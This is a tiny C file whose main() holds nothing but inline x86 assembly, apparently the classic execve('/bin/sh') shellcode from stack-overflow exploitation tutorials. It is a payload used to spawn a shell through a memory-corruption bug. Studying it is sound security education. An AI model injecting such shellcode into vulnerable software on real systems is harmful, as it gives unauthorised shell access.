void main() {
__asm__("jmp    0x2a\n\tpopl   %esi\n\tmovl   %esi,0x8(%esi)\n\tmovb   $0x0,0x7(%esi)\n\tmovl   $0x0,0xc(%esi)\n\t movl   $0xb,%eax\n\tmovl   %esi,%ebx\n\tleal   0x8(%esi),%ecx\n\tleal   0xc(%esi),%edx\n\tint    $0x80\n\tmovl   $0x1, %eax\n\tmovl   $0x0, %ebx\n\tint    $0x80\n\tcall   -0x2f\n\t.string \"/bin/sh\"\n\t");
}